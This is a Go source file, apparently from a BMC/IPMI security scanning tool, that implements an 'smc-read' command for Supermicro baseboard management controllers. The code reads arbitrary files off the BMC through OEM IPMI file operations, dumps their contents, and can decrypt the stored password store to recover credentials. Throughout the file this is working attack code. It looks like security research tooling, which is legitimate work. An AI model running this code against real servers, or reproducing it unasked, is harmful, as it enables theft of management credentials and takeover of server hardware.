package cmd

import (
	"context"
	"encoding/hex"
	"fmt"
	"math"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

const (
	smcReadMaxBytes  = 256 << 20
	smcReadRenderMax = 1 << 20
	smcReadUsage     = "usage: smc-read <remote-path> [out=<file>] [len=<n>] [offset=<n>] [decrypt|psblock] [chunk=<n>] [delay=<dur>] [profile=<id>]"
)

type smcReadOpts struct {
	remotePath string
	outFile    string
	profileID  string
	offset     uint32
	length     int
	chunk      int
	delay      time.Duration
	decrypt    bool
}

func parseIPMISMCReadArgs(args []string) (*smcReadOpts, error) {
	if len(args) == 0 || strings.TrimSpace(args[0]) == "" {
		return nil, fmt.Errorf("%s", smcReadUsage)
	}
	o := &smcReadOpts{
		remotePath: args[0],
		chunk:      ipmi.HW1MaxFileRead,
		delay:      20 * time.Millisecond,
	}
	for _, arg := range args[1:] {
		switch strings.ToLower(strings.TrimSpace(arg)) {
		case "decrypt", "psblock":
			o.decrypt = true
			continue
		}
		key, value, ok := strings.Cut(arg, "=")
		if !ok {
			return nil, fmt.Errorf("unknown smc-read option %q; %s", arg, smcReadUsage)
		}
		key, value = strings.ToLower(strings.TrimSpace(key)), strings.TrimSpace(value)
		var err error
		switch key {
		case "out":
			o.outFile = value
		case "profile":
			o.profileID = value
		case "offset":
			var n uint64
			n, err = strconv.ParseUint(value, 0, 32)
			o.offset = uint32(n)
		case "len", "length":
			o.length, err = parseSMCReadSize(value)
		case "chunk":
			o.chunk, err = strconv.Atoi(value)
		case "delay":
			o.delay, err = time.ParseDuration(value)
		default:
			return nil, fmt.Errorf("unknown smc-read option %q; %s", key, smcReadUsage)
		}
		if err != nil {
			return nil, fmt.Errorf("invalid smc-read option %s=%q: %w", key, value, err)
		}
	}
	if o.outFile == "" && o.length > smcReadRenderMax {
		return nil, fmt.Errorf("smc-read without out= is limited to 1 MiB of rendered data")
	}
	if o.chunk < 1 || o.chunk > ipmi.HW1MaxFileRead {
		return nil, fmt.Errorf("invalid smc-read chunk %d (use 1..%d)", o.chunk, ipmi.HW1MaxFileRead)
	}
	if o.delay < 0 {
		return nil, fmt.Errorf("invalid negative smc-read delay")
	}
	return o, nil
}

func smcReadLimit(opts *smcReadOpts) int {
	if opts.length > 0 {
		return opts.length
	}
	if opts.outFile == "" {
		return smcReadRenderMax
	}
	return smcReadMaxBytes
}

func parseSMCReadSize(value string) (int, error) {
	s := strings.ToLower(strings.TrimSpace(value))
	mult := uint64(1)
	switch {
	case strings.HasSuffix(s, "kb"):
		mult, s = 1024, strings.TrimSuffix(s, "kb")
	case strings.HasSuffix(s, "k"):
		mult, s = 1024, strings.TrimSuffix(s, "k")
	case strings.HasSuffix(s, "mb"):
		mult, s = 1024*1024, strings.TrimSuffix(s, "mb")
	case strings.HasSuffix(s, "m"):
		mult, s = 1024*1024, strings.TrimSuffix(s, "m")
	}
	n, err := strconv.ParseUint(s, 0, 32)
	if err != nil {
		return 0, err
	}
	total := n * mult
	if total == 0 || total > smcReadMaxBytes {
		return 0, fmt.Errorf("length must be 1..%d bytes", smcReadMaxBytes)
	}
	return int(total), nil
}

func resolveSMCReadProfile(ctx context.Context, sess *ipmi.CmdSess, profileID string) (*ipmi.MemProfile, error) {
	if profileID != "" {
		profile, ok := ipmi.MemProfileByID(profileID)
		if !ok {
			return nil, fmt.Errorf("unknown profile %q (available: %s)", profileID, strings.Join(ipmi.MemProfileIDs(), ", "))
		}
		return &profile, nil
	}
	detection, err := sess.DetectMemProfile(ctx)
	if err != nil {
		return nil, err
	}
	profile := detection.Profile
	return &profile, nil
}

func runIPMISMCRead(ctx context.Context, sess *ipmi.CmdSess, args []string) (any, error) {
	opts, err := parseIPMISMCReadArgs(args)
	if err != nil {
		return nil, err
	}
	profile, err := resolveSMCReadProfile(ctx, sess, opts.profileID)
	if err != nil {
		return nil, err
	}
	if !profile.OEMHW1Files {
		return nil, fmt.Errorf("profile %s does not carry OEMHW1 file operations; no file request sent", profile.ID)
	}

	if err := sess.HW1FileOpen(opts.remotePath, ipmi.HW1FileCopy); err != nil {
		return nil, err
	}
	requests := 1
	limit := smcReadLimit(opts)
	data := make([]byte, 0, min(limit, smcReadRenderMax))
	truncated := false
	for len(data) < limit {
		if err := ctx.Err(); err != nil {
			return nil, err
		}
		position := uint64(opts.offset) + uint64(len(data))
		if position > math.MaxUint32 {
			return nil, fmt.Errorf("smc-read offset exceeds the 32-bit fd_read field")
		}
		want := min(opts.chunk, limit-len(data))
		chunk, readErr := sess.HW1FileRead(uint32(position), want)
		requests++
		if readErr != nil {
			return nil, readErr
		}
		data = append(data, chunk...)
		if len(chunk) < want {
			break
		}
		if opts.delay > 0 && len(data) < limit {
			timer := time.NewTimer(opts.delay)
			select {
			case <-ctx.Done():
				timer.Stop()
				return nil, ctx.Err()
			case <-timer.C:
			}
		}
	}
	if opts.length == 0 && len(data) == limit {
		truncated = true
	}

	result := map[string]any{
		"action":          "smc-read",
		"profile":         profile.ID,
		"remotePath":      opts.remotePath,
		"stagingArtifact": "/tmp/filedump",
		"offset":          opts.offset,
		"bytes":           len(data),
		"requests":        requests,
		"readRequests":    requests - 1,
		"chunk":           opts.chunk,
	}
	if truncated {
		result["truncated"] = true
		result["note"] = fmt.Sprintf("read stopped at the %d-byte safety limit; pass len= to set an explicit bound", limit)
	}
	if strings.Contains(strings.ToLower(opts.remotePath), "/nv/bios") && profile.ID == "smc-h13ssf-0109" {
		result["warning"] = "this H13SSF build denies paths containing /nv/bios"
	}
	if opts.outFile != "" {
		if err := writeFileAtomic(opts.outFile, data, 0o600); err != nil {
			return nil, fmt.Errorf("writing %s: %w", opts.outFile, err)
		}
		result["outFile"] = opts.outFile
	} else {
		result["dataHex"] = hex.EncodeToString(data)
		result["hexdump"] = memHexdump(data, uint64(opts.offset))
	}

	if opts.decrypt {
		var passwords []ipmi.SMCStoredPassword
		if ipmi.SMCLooksGzip(data) {
			passwords, err = ipmi.SMCRecoverPasswords(data)
			result["decryptFormat"] = "config-archive"
		} else {
			passwords, err = ipmi.SMCDecryptPSBlock(data)
			result["decryptFormat"] = "raw-psblock"
		}
		if err != nil {
			return nil, fmt.Errorf("decrypting exfiltrated password store: %w", err)
		}
		result["recoveredPasswords"] = len(passwords)
		if len(passwords) > 0 {
			result["passwords"] = passwords
		}
	}
	return result, nil
}
